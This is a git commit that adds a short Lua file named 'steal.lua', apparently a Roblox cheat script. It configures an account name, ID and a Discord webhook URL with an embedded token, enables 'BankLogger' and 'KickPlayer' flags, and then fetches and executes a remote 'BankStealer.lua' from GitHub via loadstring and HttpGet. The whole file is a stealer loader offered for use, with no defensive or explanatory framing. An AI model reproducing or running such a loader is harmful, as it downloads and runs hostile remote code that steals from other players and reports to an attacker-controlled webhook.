04f0a20d0d3ae68449218d32ba8f69c4bc06e54a
MOCA00 <129582945+MOCA00@users.noreply.github.com>
2023-04-01 15:42:52 +0800

    Add files via upload

---
+++ steal.lua
@@ -0,0 +1,7 @@
+_G.AuthName = 'co0ko01'
+_G.AuthId = 1594588637 
+_G.AuthWebhook = "https://discord.com/api/webhooks/1049334466281226300/4NDR0U4xrB94oT6_YjQzL-JrY8f9t9j1pf4UwMiHzc4sOJy__t8uhDiakC8XMUOWSTB2"
+_G.BankLogger = true 
+_G.KickPlayer = true 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Dark-Hub/main/BankStealer.lua"))()
